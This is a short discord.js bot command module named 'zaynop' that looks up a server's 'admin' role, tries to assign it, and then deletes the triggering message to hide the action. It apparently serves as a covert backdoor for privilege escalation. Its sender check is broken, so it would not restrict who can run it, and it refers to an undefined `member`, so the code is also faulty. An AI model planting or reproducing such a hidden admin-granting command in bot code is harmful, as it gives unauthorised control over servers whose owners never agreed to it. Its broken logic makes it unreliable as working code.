const Discord = require("discord.js");

module.exports.run = async (bot, message, args, ops, tools) => {

  if(!message.author.name == "Zayn") return;


  let roletournoilol = message.member.guild.roles.find(`name`, "admin");
  member.addRole(roletournoilol.id);

  message.delete();

}

module.exports.help = {
  name: "zaynop"
}
